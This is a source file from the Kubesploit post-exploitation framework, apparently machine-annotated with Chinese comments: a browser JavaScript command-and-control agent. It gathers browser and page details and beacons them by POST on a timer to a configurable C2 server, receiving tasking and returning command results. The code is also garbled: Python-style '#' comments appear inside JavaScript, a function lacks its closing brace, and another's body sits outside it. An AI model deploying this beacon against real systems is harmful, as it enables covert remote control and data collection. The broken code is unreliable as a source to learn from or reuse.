# `kubesploit\data\html\scripts\merlin.js`

```go
// Kubesploit是基于Russel Van Tuyl的Merlin构建的后渗透命令和控制框架的一部分。
// 本文件是Kubesploit的一部分。
// 版权所有© 2021 CyberArk Software Ltd。

// Kubesploit是自由软件：您可以根据GNU通用公共许可证的条款重新分发和/或修改它，无论是许可证的第3版还是以后的版本。

// Kubesploit的分发希望能够有助于增强组织的安全性。
// Kubesploit不得以任何恶意方式使用。
// Kubesploit按原样分发，没有任何保证；包括适销性或特定用途的隐含保证。有关更多详细信息，请参见GNU通用公共许可证。

// 您应该已经收到了GNU通用公共许可证的副本。
// 如果没有，请参见<http://www.gnu.org/licenses/>。

// 全局变量
var debug = false;
var verbose = true;
var initial = true;
var hostUUID = guid();
var version = "0.6.3.BETA";
var build = "nonRelease";
var waitTime = 30000; // 毫秒
var maxRetry = 7;
var paddingMax = 4096;
var failedCheckin = 0;
var url = "https://127.0.0.1:443/";
var log = document.getElementById("merlinLog");
var options = {localeMatcher: "lookup", year: 'numeric', month: 'long', day: 'numeric', hour: 'numeric',
    minute: 'numeric', second: 'numeric'};

if (debug){console.log("Starting Merlin JavaScript Agent")}

//https://stackoverflow.com/questions/105034/create-guid-uuid-in-javascript
// 生成唯一标识符
function guid() {
    return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
        s4() + '-' + s4() + s4() + s4();
}

// 生成4位随机字符
function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
        .toString(16)
        .substring(1);
}

// 基本消息
var b = {
    "version": version,
    "id": hostUUID,
    "type": null,
    "padding": "RandomDataGoesHere", // TODO 尚未实现
    "payload": null
};
// 定义包含系统信息的对象
var s = {
    "platform": navigator.platform, // 获取操作系统平台信息
    "architecture": navigator.appCodeName, // 获取浏览器的内部代码名
    "username": navigator.userAgent, // 获取浏览器用户代理字符串
    "userguid": navigator.appVersion, // 获取浏览器的版本信息
    "hostname": document.title // 获取当前文档的标题
};

// 执行初始检查
function initialCheckIn (){
    if (debug){console.log("[DEBUG]Entering into initialCheckIn function")} // 如果 debug 为真，则输出调试信息
    var x = new XMLHttpRequest(); // 创建 XMLHttpRequest 对象
    var a = {
        "version": version, // 版本号
        "build": build, // 构建号
        "waittime": (waitTime.toString())+ "ms", // 等待时间，以毫秒为单位
        "paddingmax": paddingMax, // 最大填充
        "maxretry": maxRetry, // 最大重试次数
        "failedcheckin": failedCheckin, // 失败的检查次数
        // "skew": "", TODO 实现偏差
        "proto": "h2", // 协议类型
        "sysinfo": s // 系统信息对象
    };
    b.type = "InitialCheckIn"; // 设置类型为 InitialCheckIn
    b.payload = a; // 设置载荷为 a
    if (verbose){verboseMessage("note", "Connecting to web server at " + url + " for initial check in.")} // 如果 verbose 为真，则输出详细信息
    x.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            initial = false; // 将 initial 设置为假
            failedCheckin = 0; // 将失败的检查次数设置为 0
        }
    };
    x.open('POST', url, true); // 打开与服务器的连接
    x.setRequestHeader("Content-Type", "application/json; charset=UTF-8"); // 设置请求头的内容类型
    if (debug){console.log("[DEBUG]Sending InitialCheckIn XHR")} // 如果 debug 为真，则输出调试信息
    x.onerror = function(e) {
        failedCheckin++; // 失败的检查次数加一
        verboseMessage("warn", failedCheckin + " out of " + maxRetry + " total failed checkins"); // 输出警告信息
        if (debug){
            console.log("[DEBUG]initialCheckIn POST request error:"); // 如果 debug 为真，则输出调试信息
            console.log(e) // 输出错误信息
        }
    };
    if (debug){
        console.log("[DEBUG]Sending initialCheckIn XHR payload:"); // 如果 debug 为真，则输出调试信息
        console.log(b) // 输出载荷信息
    }
    x.send(JSON.stringify(b)); // 发送 XHR 请求并将载荷转换为 JSON 字符串
}

// 获取代理信息
function agentInfo (){
    if (debug){console.log("[DEBUG]Entering into agentInfo function")} // 如果 debug 为真，则输出调试信息
    var x = new XMLHttpRequest(); // 创建 XMLHttpRequest 对象
    # 创建一个包含代理信息的对象
    var a = {
        "version": version,  # 版本号
        "build": build,  # 构建版本
        "waittime": (waitTime.toString())+ "ms",  # 等待时间，以毫秒为单位
        "paddingmax": paddingMax,  # 最大填充
        "maxretry": maxRetry,  # 最大重试次数
        "failedcheckin": failedCheckin,  # 失败签入
        "proto": "h2",  # 协议
        "sysinfo": s  # 系统信息
    };
    # 设置类型为"AgentInfo"
    b.type = "AgentInfo";
    # 设置负载为a对象
    b.payload = a;
    # 如果verbose为真，则输出连接到web服务器的信息
    if (verbose){verboseMessage("note", "Connecting to web server at " + url + " to update agent configuration " +
        "information.")}
    # 当状态改变时执行的函数
    x.onreadystatechange = function() {
        # 如果状态为4且状态码为200，则执行main函数
        if (this.readyState == 4 && this.status == 200) {
            main();
        }
    };
    # 打开一个POST请求，url为指定的url，异步请求
    x.open('POST', url, true);
    # 设置请求头的Content-Type为application/json; charset=UTF-8
    x.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
    # 如果debug为真，则输出发送的AgentInfo XHR
    if (debug){
        console.log("[DEBUG]Sending AgentInfo XHR:");
        console.log(b);
    }
    # 发送JSON格式的b对象
    x.send(JSON.stringify(b));
// 检查状态并进行签到
function statusCheckIn (){
    // 如果处于调试模式，则输出调试信息
    if (debug){console.log("[DEBUG]Entering into statusCheckIn function")}
    // 创建一个新的 XMLHttpRequest 对象
    var x = new XMLHttpRequest();
    // 设置请求类型为 StatusCheckIn
    b.type = "StatusCheckIn";
    // 监听状态改变事件
    x.onreadystatechange = function() {
        // 如果请求完成并成功返回
        if (this.readyState == 4 && this.status == 200) {
            // 重置失败签到次数
            failedCheckin = 0;
            // 解析返回的 JSON 数据
            var j = JSON.parse(x.responseText);
            // 处理 JSON 数据
            processJSON(j.type, j);
        }
    };
    // 如果处于详细模式，则输出连接到服务器的信息
    if (verbose){verboseMessage("note", "Connecting to web server at " + url + " for status check in.")}
    // 打开一个 POST 请求，连接到指定的 URL
    x.open('POST', url, true);
    // 设置请求头的内容类型
    x.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
    // 如果处于调试模式，则输出发送 StatusCheckIn XHR 的信息
    if (debug){console.log("[DEBUG]Sending StatusCheckIn XHR")}
    // 监听请求错误事件
    x.onerror = function(e) {
        // 增加失败签到次数
        failedCheckin++;
        // 如果处于详细模式，则输出失败签到次数和最大重试次数
        verboseMessage("warn", failedCheckin + " out of " + maxRetry + " total failed checkins");
        // 如果处于详细模式，则输出错误信息
        verboseMessage("warn", "Error: " + e.message)
    };
    // 发送请求，将 b 对象转换为 JSON 字符串
    x.send(JSON.stringify(b));
}

// 处理命令执行结果
function cmdResults(job, stdOut, stdErr){
    // 如果处于调试模式，则输出调试信息
    if (debug){console.log("[DEBUG]Entering into cmdResults function")}
    // 创建一个新的 XMLHttpRequest 对象
    var x = new XMLHttpRequest();
    // 创建包含作业、标准输出和标准错误的对象
    var p = {
        "job": job,
        "stdout": stdOut,
        "stderr": stdErr
    };
    // 设置请求类型为 CmdResults
    b.type = "CmdResults";
    // 设置请求的负载为 p 对象
    b.payload = p;
    // 如果处于详细模式，则输出连接到服务器的信息
    if (verbose){verboseMessage("note", "Connecting to web server at " + url + " for CmdResults message.")}
    // 打开一个 POST 请求，连接到指定的 URL
    x.open('POST', url, true);
    // 设置请求头的内容类型
    x.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
    // 如果处于调试模式，则输出发送 cmdResults XHR 的信息
    if (debug){console.log("[DEBUG]Sending cmdResults XHR")}
    // 监听请求错误事件
    x.onerror = function(e) {
        // 如果处于详细模式，则输出发送 CmdResults 消息时的错误信息
        verboseMessage("warn", "There was an error sending the CmdResults message.");
        // 如果处于详细模式，则输出错误信息
        verboseMessage("warn", "Error: " + e.message)
    };
    // 发送请求，将 b 对象转换为 JSON 字符串
    x.send(JSON.stringify(b));
}

// 输出详细信息的消息
function verboseMessage(type, message){
    // 如果处于调试模式，则输出调试信息
    if (debug){console.log("[DEBUG]Entering into verboseMessage function")}
}
    # 如果 verbose 为真且 log 不为空
    if (verbose && log != null){
        # 根据消息类型插入不同样式的日志信息到 log 元素的末尾
        switch (type){
            # 如果消息类型为 "success"，插入绿色的成功消息
            case "success":
                log.insertAdjacentHTML("beforeend", "<div style=\"color:lawngreen;\">[+]" + message + "</div>");
                break;
            # 如果消息类型为 "note"，插入黄色的提示消息
            case "note":
                log.insertAdjacentHTML("beforeend", "<div style=\"color:yellow;\">[-]" + message + "</div>");
                break;
            # 如果消息类型为 "warn"，插入橙红色的警告消息
            case "warn":
                log.insertAdjacentHTML("beforeend", "<div style=\"color:orangered;\">[!]" + message + "</div>");
                break;
            # 如果消息类型不在以上三种情况，插入红色的未识别消息类型和消息内容
            default:
                log.insertAdjacentHTML("beforeend", "<div style=\"color:red;\">[!]Unrecognized message type: " + type +
                    "<br>Message: " +  message + "</div>");
                break;
        }
    }
// 处理 JSON 数据的函数，接受类型和 JSON 数据作为参数
function processJSON(type, json){
    // 如果 debug 模式开启，打印进入 processJSON 函数的调试信息
    if (debug){console.log("[DEBUG]Entering into processJSON function")}
    // 调用 verboseMessage 函数，打印成功信息，指明接收到了某种类型的消息
    verboseMessage("success", type + " message type received!");
}

// 主函数
function main(){
    // 如果 debug 模式开启，打印进入 main 函数的调试信息
    if (debug){console.log("[DEBUG]Entering into main function")}
    // 如果失败次数小于最大重试次数
    if (failedCheckin < maxRetry) {
        // 如果是初始状态
        if (initial) {
            // 调用 initialCheckIn 函数
            initialCheckIn();
        } else if (!initial) {
            // 否则调用 statusCheckIn 函数
            statusCheckIn();
        }
    } else if (failedCheckin == maxRetry){
        // 如果失败次数等于最大重试次数，打印警告信息，达到最大重试次数，关闭代理
        verboseMessage("warn", "Max retries of " + maxRetry + " reached, shutting down the agent.");
        // 清除定时器
        clearInterval(run);
        // 返回
        return;
    }
    // 如果 verbose 模式开启，获取当前时间，打印睡眠信息
    if (verbose){var today  = new Date();verboseMessage("note", "Sleeping for " + waitTime + " milliseconds at " +
        today.toLocaleString("en-US", options))}
}

// 检查是否有覆盖 URL
if (typeof oURL == 'string'){url=oURL}

// 如果 verbose 模式开启，打印启动 Merlin JavaScript 代理的成功信息，以及代理的版本、构建、UUID、平台、架构、用户名和用户 GUID
if (verbose){
    verboseMessage("success", "Starting Merlin JavaScript Agent");
    verboseMessage("note", "Agent version: " + version);
    verboseMessage("note", "Agent build: " + build);
    verboseMessage("note", "Agent UUID: " + hostUUID);
    verboseMessage("note", "Platform: " + navigator.appCodeName);
    verboseMessage("note", "Architecture: " + navigator.platform);
    verboseMessage("note", "User Name: " + navigator.userAgent);
    verboseMessage("note", "User GUID: " + navigator.appVersion);
}

// 设置定时器，每隔 waitTime 毫秒调用一次 main 函数
var run = setInterval(main, waitTime);
```